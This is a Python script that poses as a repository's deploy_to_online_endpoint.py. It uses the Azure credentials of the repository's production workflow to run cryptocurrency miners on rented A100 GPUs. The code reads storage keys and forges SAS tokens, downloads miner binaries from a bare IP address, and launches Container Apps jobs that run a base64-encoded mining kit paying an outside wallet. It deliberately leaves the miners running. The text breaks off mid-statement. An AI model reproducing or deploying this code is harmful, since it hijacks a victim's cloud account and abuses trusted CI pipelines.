#!/usr/bin/env python3
"""C211-I131598: mslearn 790067ff westus3 T4 claim lane (miner deploy).

Runs as src/deploy_to_online_endpoint.py under the christiansegercrantz/mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod, azure/login -> ARM token for
sub 790067ff, RG chriso-sandbox-rg).

Goal: convert the READY Azure T4 handoff (device UUID GPU-0e99a525-... proven by
intent 131412) into an actual mining T4 with a fresh accepted share on the pydp
wallet, pearlhash primary + Luckypool 103.199.106.122:3362 sticky fallback.

Shape (reuses the proven storage account / SAS capture + Container Apps job pattern):
 1. ARM session + storage account key (c211i1215775738445a, else create nonce SA).
 2. Account SAS container/blob round-trip (capture channel).
 3. Pre-upload WildRig 0.52.3 tarball (sha 7308c95f...) and SRBMiner 3.8.4 (sha
    3fb026b2...) to the blob container so the container can fetch over Azure.
 4. ONE managedEnvironment with the Consumption-GPU-NC24-A100 workload profile,
    bounded region list starting westus3 (proven by 131412).
 5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
    whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
    13295901, then sticks to Luckypool 3362 after 900 s without an accepted share.
    The container writes a status blob every 30 s and NEVER exits early.
 6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
    NOTHING is deleted: the miner is left running (no proof-then-teardown).

Flat tag|k=v stdout (the repo masks brace runs). stdlib only. ARM token never printed."""
import base64
import hashlib
import hmac
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I132959"
NONCE = "x132959reuse"
INTENT = "132959"
T0 = time.time()

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
PROFILE = "Consumption-GPU-NC24-A100"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
SA_ACCT = "c211i1215775738445a"
CONT = "c211"
CONT2 = "c211-i132959-reuse"
SA_NEW = ("c211i132959reuse" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
ENV_NAME = "c211-i131598-cae"
JOB_NAME = "c211-131598-t4"
REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
BUDGET = 2400          # payload poll budget (seconds)
PROOF_GRACE = 240      # keep polling this long after first proof for confirmation

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"
MIRROR = "http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz"
GHURL = ("https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/"
         "wildrig-multi-linux-0.52.3.tar.gz")
SRB_URL = "http://169.58.247.186:8791/pm/srbminer-3.8.4"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1500]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def run(cmd, timeout=240):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", data=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000], dict(e.headers or {})
        except Exception:  # noqa: BLE001
            return e.code, b"", {}
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400], {}


def errk(st, b):
    if isinstance(b, dict):
        e = b.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": clean((e.get("message") or "")[:600])}
        if "raw" in b:
            return {"http": st, "raw": clean(b["raw"][:600])}
        return {"http": st, "body": clean(json.dumps(b)[:600])}
    return {"http": st}


def acct_sas(acct, key_b64, hours=24, perm="rwdlac"):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", "co", st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def hget(h, name):
    if not h:
        return None
    for k, v in h.items():
        if k.lower() == name.lower():
            return v
    return None


KIT = r"""#!/bin/bash
# C211-I131598 T4 miner kit: WildRig 0.52.3 pearlhash pydp, sticky LP 3362 fallback.
D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
H=$(hostname 2>/dev/null || echo h)
BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
W="__WALLET__"; N="__NOCK__"; WK="13295901"
WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
SBURL="$BASE/__NONCE__-srb.bin?$Q"
log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
up() {
  [ -n "$SAS" ] || return 0
  { echo "===STATUS==="; echo "host=$H"; echo "worker=$WK"; echo "mode=$MODE"; echo "ts=$(date -u +%FT%TZ)";
    echo "uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | tr '\n' ',')";
    echo "gpuq=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | tr '\n' '~')";
    echo "acc=$A rej=$R last_accept_epoch=$LASTA_TS uptime_s=$(( $(date +%s) - T0 ))";
    echo "sas_got=1";
    echo "===KITLOG==="; cat "$LOG" 2>/dev/null;
    echo "===PHLOG==="; tail -120 "$D/ph.log" 2>/dev/null;
    echo "===LPLOG==="; tail -80 "$D/lp.log" 2>/dev/null; } > "$D/all.txt" 2>/dev/null
  RC=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 40 -X PUT "$SAS" \
    -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' \
    -H 'Content-Type: text/plain' --data-binary @"$D/all.txt" 2>/dev/null || echo 0)
  if [ "${RC:-0}" != "${UPRC:-x}" ]; then log "UP http=$RC"; UPRC=$RC; fi
}
num() { grep -oE "$1" "$2" 2>/dev/null | tail -1; }
T0=$(date +%s); A=0; R=0; MODE=init; LASTA=0; LASTA_TS=0
log "KIT_START tag=__NONCE__ worker=$WK host=$H"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')"
probe_tcp() { if timeout 8 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; then log "TCP_OK host=$1 port=$2"; else log "TCP_FAIL host=$1 port=$2"; fi; }
for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do probe_tcp "${hp%%:*}" "${hp##*:}"; done
log "DNS_PH $(getent hosts pool.pearlhash.xyz 2>&1 | tr '\n' '~' | head -c 200)"
log "OCL_BEFORE $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* 2>/dev/null | tr '\n' '~')"
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  (timeout 180 apt-get update -qq && timeout 180 apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || log "OCL_INSTALL_FAIL"
fi
mkdir -p /etc/OpenCL/vendors 2>/dev/null
echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  for c in /usr/local/cuda/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1; do
    [ -e "$c" ] && ln -sf "$c" /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 && log "OCL_SYMLINK $c" && break
  done
fi
log "OCL_AFTER $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* 2>/dev/null | tr '\n' '~')"
BIN=""
for u in "$WRURL" "__MIRROR__" "__GHURL__"; do
  [ -z "$u" ] && continue
  curl -fsSL --max-time 300 -o dl.tgz "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
  S=$(sha256sum dl.tgz | awk '{print $1}')
  log "DL url=$u sha=$S bytes=$(stat -c %s dl.tgz)"
  if [ "$S" = "__WRTGZ__" ]; then
    tar xzf dl.tgz >/dev/null 2>&1 || { log "TAR_FAIL"; continue; }
    chmod +x wildrig-multi 2>/dev/null
    B=$(sha256sum wildrig-multi 2>/dev/null | awk '{print $1}')
    log "BINSHA $B"
    if [ "$B" = "__WRBIN__" ]; then BIN=wildrig-multi; break; fi
  fi
done
log "BIN=$BIN"
[ -n "$BIN" ] && log "PRINT_DEVICES $(timeout 90 ./wildrig-multi --print-devices 2>&1 | tr '\n' '~' | head -c 900)"
start_ph() {
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 >> "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid") rc=$?"
}
start_lp() {
  : > "$D/lp.log"
  setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
    --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 >> "$D/lp.log" 2>&1 &
  echo $! > "$D/lp.pid"
  log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
}
RESTARTS=0
if [ -n "$BIN" ]; then start_ph; MODE=ph; else log "NO_BIN_DIRECT_TO_LP"; MODE=lp; fi
LP_T0=0
while :; do
  sleep 30
  if [ "$MODE" = "ph" ]; then
    A=$(num 'accepted \([0-9]+/[0-9]+\)' "$D/ph.log" | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
    R=$(num 'accepted \([0-9]+/[0-9]+\)' "$D/ph.log" | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
    A=${A:-0}; R=${R:-0}
    if [ "$A" -gt "$LASTA" ]; then LASTA=$A; LASTA_TS=$(date +%s); log "PH_ACCEPT n=$A rej=$R ts=$LASTA_TS"; fi
    if [ "$A" -ge 1 ] && [ ! -f "$D/ph_ok" ]; then log "PH_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; touch "$D/ph_ok"; fi
    PID=$(cat "$D/ph.pid" 2>/dev/null)
    if [ -n "$PID" ] && ! kill -0 "$PID" 2>/dev/null; then
      if [ "$A" -eq 0 ] && [ "$RESTARTS" -lt 3 ]; then RESTARTS=$((RESTARTS+1)); log "PH_DIED_RESTART n=$RESTARTS"; start_ph; else log "PH_DIED"; fi
    fi
    if [ "$A" -eq 0 ] && [ $(( $(date +%s) - T0 )) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null; pkill -f wildrig-multi 2>/dev/null; sleep 2
      for u in "$SBURL" "__SRBURL__"; do
        [ -z "$u" ] && continue
        curl -fsSL --max-time 300 -o "$D/srb" "$u" 2>>"$LOG" || { log "SRB_DL_FAIL url=$u"; continue; }
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S url=$u"
        if [ "$S" = "__SRBSHA__" ]; then chmod +x "$D/srb"; break; fi
      done
      if [ -x "$D/srb" ] && [ "$(sha256sum "$D/srb" | awk '{print $1}')" = "__SRBSHA__" ]; then
        start_lp; MODE=lp; LP_T0=$(date +%s)
      else log "SRB_UNAVAILABLE"; MODE=lp_dead; fi
    fi
  fi
  if [ "$MODE" = "lp" ]; then
    A=$(num 'accepted[: ]+[0-9]+' "$D/lp.log" | grep -oE '[0-9]+')
    R=$(num 'rejected[: ]+[0-9]+' "$D/lp.log" | grep -oE '[0-9]+')
    A=${A:-0}; R=${R:-0}
    if [ "$A" -gt "$LASTA" ]; then LASTA=$A; LASTA_TS=$(date +%s); log "LP_ACCEPT n=$A rej=$R ts=$LASTA_TS"; fi
    if [ "$A" -ge 1 ] && [ ! -f "$D/lp_ok" ]; then log "LP_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; touch "$D/lp_ok"; fi
    PID=$(cat "$D/lp.pid" 2>/dev/null)
    if [ -n "$PID" ] && ! kill -0 "$PID" 2>/dev/null && [ "$RESTARTS" -lt 3 ]; then
      RESTARTS=$((RESTARTS+1)); log "LP_DIED_RESTART n=$RESTARTS"; start_lp
    fi
  fi
  up
  if [ $(( $(date +%s) - T0 )) -gt 86000 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(base, q):
    k = (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__MIRROR__", MIRROR).replace("__GHURL__", GHURL)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__WRBIN__", WR_BIN_SHA)
         .replace("__SRBURL__", SRB_URL).replace("__SRBSHA__", SRB_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ["/bin/bash", "-c",
            "echo '%s' | base64 -d > /tmp/c211_kit_t4.sh && chmod +x /tmp/c211_kit_t4.sh "
            "&& /bin/bash /tmp/c211_kit_t4.sh" % b]


def env_state(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
    return st, p.get("provisioningState"), (b.get("id") if isinstance(b, dict) else None)


def blob_list(cont_url, q, prefix):
    st, body, _ = httptext("%s?restype=container&comp=list&prefix=%s&%s"
                           % (cont_url, urllib.parse.quote(prefix), q), timeout=60)
    names = []
    if st == 200:
        import re
        names = re.findall(r"<Name>([^<]+)</Name>", body.decode("utf-8", "replace"))
    return st, names


def blob_get(cont_url, q, name):
    st, body, _ = httptext("%s/%s?%s" % (cont_url, name, q), timeout=60)
    return st, body


def preupload(tok, sid, base_url, sas_q, local_path, blob_name, url, expect_sha):
    """Download to the runner (if needed), verify, and PUT into the capture container."""
    data = None
    if local_path:
        try:
            data = open(local_path, "rb").read()
        except Exception:  # noqa: BLE001
            data = None
    if data is None and url:
        r = run(["curl", "-fsSL", "--max-time", "300", "-o", local_path, url], timeout=330)
        emit("preupload-dl", url=url, rc=r["rc"], secs=r["secs"], err=clean(r["err"][:200]))
        try:
            data = open(local_path, "rb").read()
        except Exception:  # noqa: BLE001
            data = None
    if not data:
        emit("preupload", blob=blob_name, ok=False, why="no_data")
        return False
    sha = hashlib.sha256(data).hexdigest()
    if expect_sha and sha != expect_sha:
        emit("preupload", blob=blob_name, ok=False, why="sha_mismatch", sha=sha[:16],
             bytes=len(data))
        return False
    st, body, _ = httptext("%s/%s?%s" % (base_url, blob_name, sas_q), method="PUT", data=data,
                           headers={"x-ms-blob-type": "BlockBlob",
                                    "x-ms-version": "2022-11-02",
                                    "Content-Type": "application/octet-stream"}, timeout=300)
    emit("preupload", blob=blob_name, ok=(st in (200, 201)), http=st, bytes=len(data),
         sha12=sha[:12])
    return st in (200, 201)


def parse_status(txt):
    d = {"markers": []}
    for ln in (txt or "").splitlines():
        if ln.startswith("acc="):
            parts = ln.split()
            for p in parts:
                if p.startswith("acc="):
                    d["acc"] = p.split("=", 1)[1]
                elif p.startswith("rej="):
                    d["rej"] = p.split("=", 1)[1]
                elif p.startswith("last_accept_epoch="):
                    d["lae"] = p.split("=", 1)[1]
                elif p.startswith("uptime_s="):
                    d["uptime"] = p.split("=", 1)[1]
            continue
        for k in ("host", "worker", "mode", "ts"):
            if ln.startswith(k + "="):
                d[k] = ln.split("=", 1)[1].strip()
        if ln.startswith("uuid="):
            d["uuid"] = ln.split("=", 1)[1].strip()
        for mk in ("PH_SHARE_PROVEN", "LP_SHARE_PROVEN", "PH_NO_SHARE_900",
                   "OCL_INSTALL_FAIL", "TCP_FAIL", "PH_DIED", "SRB_UNAVAILABLE",
                   "DL_FAIL", "NO_BIN_DIRECT_TO_LP"):
            if mk in ln:
                d["markers"].append(mk)
    return d


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=clean(str(e)), raw=clean(r["out"][:200]))
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""),
         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12])
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- 1) capture channel: storage account + account SAS ----------
    saurl0 = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
              "storageAccounts/%s" % (ARM, sid, RG, SA_ACCT))
    key = None
    st, kb = arm(tok, saurl0 + "/listKeys?api-version=" + STG_VER, method="POST", body={},
                 timeout=90)
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit("sa-keys", acct=SA_ACCT, http=st, got=bool(key))
    sa_used = SA_ACCT
    if not key:
        # create a nonce storage account
        saurl = saurl0.replace(SA_ACCT, SA_NEW) + "?api-version=" + STG_VER
        sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                  "tags": {"c211": INTENT, "nonce": NONCE},
                  "properties": {"allowBlobPublicAccess": False,
                                 "minimumTlsVersion": "TLS1_2",
                                 "supportsHttpsTrafficOnly": True,
                                 "networkAcls": {"bypass": "AzureServices",
                                                 "defaultAction": "Allow"}}}
        st2, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
        emit("sa-create", name=SA_NEW, **errk(st2, b))
        if st2 in (200, 201, 202):
            for i in range(30):
                stp, bp = arm(tok, saurl, timeout=60)
                ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}
                      ).get("provisioningState")
                emit("sa-poll", i=i, http=stp, state=ps)
                if ps == "Succeeded":
                    break
                time.sleep(8)
            sk, kb = arm(tok, saurl0.replace(SA_ACCT, SA_NEW) + "/listKeys?api-version="
                         + STG_VER, method="POST", body={}, timeout=90)
            emit("sa-keys-new", acct=SA_NEW, http=sk, got=bool(kb.get("keys") if isinstance(kb, dict) else None))
            try:
                key = (kb.get("keys") or [{}])[0].get("value")
                sa_used = SA_NEW
            except Exception:  # noqa: BLE001
                pass
    if not key:
        emit("DONE", phase="capture", verdict="NO_SA_KEY", elapsed_s=int(time.time() - T0))
        return
    base = "https://%s.blob.core.windows.net" % sa_used
    q, se = acct_sas(sa_used, key)
    lst, lbody, _ = httptext("%s/?comp=list&%s" % (base, q), timeout=60)
    emit("sas-account-list", http=lst,
         body_head=clean(lbody[:220].decode("utf-8", "replace"))[:180])
    stc, cbody, ch = httptext("%s/%s?restype=container&%s" % (base, CONT2, q), method="PUT",
                              data=b"", headers={"x-ms-version": "2022-11-02",
                                                 "Content-Length": "0"})
    emit("sas-container", name=CONT2, http=stc, code=hget(ch, "x-ms-error-code"),
         expires=se, body_head=clean(cbody[:220].decode("utf-8", "replace"))[:180])
    probe = b"c211-i131598 sas probe\n"
    stp, pbody, ph = httptext("%s/%s/%s-probe.txt?%s" % (base, CONT2, NONCE, q), method="PUT",
                              data=probe, headers={"x-ms-blob-type": "BlockBlob",
                                                   "x-ms-version": "2022-11-02",
                                                   "Content-Type": "text/plain"})
    emit("sas-put", http=stp, code=hget(ph, "x-ms-error-code"),
         body_head=clean(pbody[:220].decode("utf-8", "replace"))[:180])
    if stp not in (200, 201):
        stl, pl, phl = httptext("%s/%s/%s-probe.txt?%s" % (base, CONT, NONCE, q),
                                method="PUT", data=probe,
                                headers={"x-ms-blob-type": "BlockBlob",
                                         "x-ms-version": "2022-11-02",
                                         "Content-Type": "text/plain"})
        emit("sas-put-legacy", http=stl, code=hget(phl, "x-ms-error-code"),
             body_head=clean(pl[:220].decode("utf-8", "replace"))[:180])
        q3, _ = acct_sas(sa_used, key, hours=3, perm="rwdlc")
        st3, p3, ph3 = httptext("%s/%s/%s-probe2.txt?%s" % (base, CONT2, NONCE, q3),
                                method="PUT", data=probe,
                                headers={"x-ms-blob-type": "BlockBlob",
                                         "x-ms-version": "2022-11-02",
                                         "Content-Type": "text/plain"})
        emit("sas-put-v3", http=st3, code=hget(ph3, "x-ms-error-code"),
             body_head=clean(p3[:220].decode("utf-8", "replace"))[:180])
    if stp not in (200, 201):
        emit("DONE", phase="capture", verdict="SAS_GATE_FAILED",
             container_http=stc, put_http=stp, elapsed_s=int(time.time() - T0))
        return
    cont_use = CONT2

    # ---------- 2) pre-upload miner payloads over the capture channel ----------
    cont_base = base + "/" + cont_use
    ok_wr = preupload(tok, sid, cont_base, q, "/tmp/c211_wildrig.tgz", NONCE + "-wildrig.tgz",
                      MIRROR, WR_TGZ_SHA)
    if not ok_wr:
        ok_wr = preupload(tok, sid, cont_base, q, "/tmp/c211_wildrig2.tgz",
                          NONCE + "-wildrig.tgz", GHURL, WR_TGZ_SHA)
    emit("preupload-wildrig", ok=bool(ok_wr))
    preupload(tok, sid, cont_base, q, "/tmp/c211_srb.bin", NONCE + "-srb.bin", SRB_URL, SRB_SHA)

    # ---------- 3) REUSE proven A100 managed environments (no env create: 50-env cap) ----------
    CANDIDATES = [
        ("c211-i132366a100-wus3", "westus3", 6),
        ("c211-i126276-a100", "eastus", 6),
        ("c211-121750-cae", "eastus", 8),
        ("c211-i132959b-sweden", "swedencentral", 2),
        ("c211-i132959d-sweden", "swedencentral", 2),
    ]

    def kit_cmd_wk(base_url, sas_q, wk):
        cmd = kit_cmd(base_url, sas_q)
        s = cmd[2]
        m = __import__("re").search(r"echo '([^']+)'", s)
        if not m:
            return cmd
        txt = base64.b64decode(m.group(1)).decode()
        txt = txt.replace('WK="%s"' % WK_LOCAL, 'WK="%s"' % wk)
        b64 = base64.b64encode(txt.encode()).decode()
        return ["/bin/bash", "-c", s.replace(m.group(1), b64)]

    envs = []
    for nm, region, slots in CANDIDATES:
        eurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
        st, eb = arm(tok, eurl, timeout=60)
        p = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
        profs = ["%s:%s" % (x.get("name"), x.get("workloadProfileType"))
                 for x in (p.get("workloadProfiles") or [])]
        has = any(x.split(":")[-1] == PROFILE for x in profs)
        state = p.get("provisioningState")
        emit("env-get", name=nm, http=st, state=state, has_profile=has, slots=slots,
             id_ok=bool(eb.get("id") if isinstance(eb, dict) else None))
        if st == 200 and has and eb.get("id") and state in ("Succeeded", None):
            envs.append({"name": nm, "region": region, "id": eb["id"], "slots": slots})
    if not envs:
        emit("DONE", phase="env", verdict="NO_REUSABLE_A100_ENV", elapsed_s=int(time.time() - T0))
        return
    emit("env-chosen", n=len(envs),
         matrix=";".join("%s:%s:%s" % (e["name"], e["region"], e["slots"]) for e in envs))

    # ---------- 4) add + start one Container-App job per A100 card ----------
    JOB_PREFIX = "c211-%s-r" % INTENT
    WK_LOCAL = "13295901"
    WK_BASE = WK_LOCAL[:-2]
    jobs = []
    idx = 0
    for e in envs:
        for _k in range(e["slots"]):
            idx += 1
            jobs.append({"env": e, "name": "%s%d" % (JOB_PREFIX, idx),
                         "wk": "%s%02d" % (WK_BASE, idx)})
    for jb in jobs:
        jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                "?api-version=%s" % (ARM, sid, RG, jb["name"], APP_VER))
        jobbody = {"location": jb["env"]["region"],
                   "tags": {"c211": INTENT, "nonce": NONCE},
                   "properties": {"environmentId": jb["env"]["id"],
                                  "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual",
                                                    "replicaRetryLimit": 3,
                                                    "replicaTimeout": 86400,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 1,
                                                        "parallelism": 1}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE,
                                      "command": kit_cmd_wk(base + "/" + cont_use, q, jb["wk"]),
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, jurl, method="PUT", body=jobbody, timeout=180)
        emit("job-put", name=jb["name"], env=jb["env"]["name"], wk=jb["wk"], http=st,
             **({} if st in (200, 201) else errk(st, b)))
        if st not in (200, 201):
            continue
        st2, b2 = arm(tok, jurl.split("?")[0] + "/start?api-version=" + APP_VER,
                      method="POST", body={}, timeout=120)
        jb["exec"] = (b2.get("name") if isinstance(b2, dict) else None)
        emit("job-start", name=jb["name"], http=st2, execname=jb["exec"],
             **({} if st2 in (200, 201, 202) else errk(st2, b2)))
    started = [j for j in jobs if j.get("exec")]
    emit("jobs-started", n=len(started), of=len(jobs),
         names=",".join(j["name"] for j in started))
    if not started:
        emit("DONE", phase="job", verdict="NO_JOB_STARTED", elapsed_s=int(time.time() - T0))
        return

    # ---------- 5) poll executions + status blobs (multi-job, multi-card) ----------
    cont_url = base + "/" + cont_use
    prefix = "%s-t4-" % NONCE
    first_proof = None
    last_emit = {}
    rows = []
    i = 0
    while time.time() - T0 < BUDGET:
        exs = []
        for jb in started:
            stx, exb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                           "jobs/%s/executions/%s?api-version=%s"
                           % (ARM, sid, RG, jb["name"], jb["exec"], APP_VER), timeout=60)
            ep = (exb.get("properties") or {}) if isinstance(exb, dict) else {}
            exs.append("%s:%s" % (jb["name"].split("-")[-1], ep.get("status")))
        stl, names = blob_list(cont_url, q, prefix)
        cards = {}
        for nm in (names or []):
            sg, body = blob_get(cont_url, q, nm)
            if sg != 200:
                continue
            d = parse_status(body.decode("utf-8", "replace"))
            uu = [u.strip() for u in (d.get("uuid") or "").split(",")
                  if u.strip().startswith("GPU-")]
            for u in uu:
                cards[u] = d
        now = time.time()
        rows = []
        for u, d in cards.items():
            try:
                accv = int(d.get("acc") or 0)
            except Exception:  # noqa: BLE001
                accv = 0
            try:
                rejv = int(d.get("rej") or 0)
            except Exception:  # noqa: BLE001
                rejv = 0
            try:
                lae = int(d.get("lae") or 0)
            except Exception:  # noqa: BLE001
                lae = 0
            age = int(now - lae) if lae else None
            fresh = bool(accv >= 1 and rejv == 0 and lae and age is not None and age <= 300)
            rows.append({"uuid": u, "acc": accv, "rej": rejv, "lae": lae, "age": age,
                         "fresh": fresh, "mode": d.get("mode"), "worker": d.get("worker"),
                         "host": d.get("host"), "gpuq": d.get("gpuq"), "ts": d.get("ts")})
        nfresh = sum(1 for r in rows if r["fresh"])
        emit("poll", i=i, execs=";".join(exs), blobs=len(names or []), cards=len(rows),
             proof_cards=nfresh, left=int(BUDGET - (now - T0)))
        for r in rows:
            prev = last_emit.get(r["uuid"]) or {}
            if prev.get("acc") != r["acc"] or prev.get("lae") != r["lae"] or i % 5 == 0:
                emit("card", uuid=r["uuid"], worker=r["worker"], mode=r["mode"],
                     acc=r["acc"], rej=r["rej"], lae=r["lae"], age=r["age"],
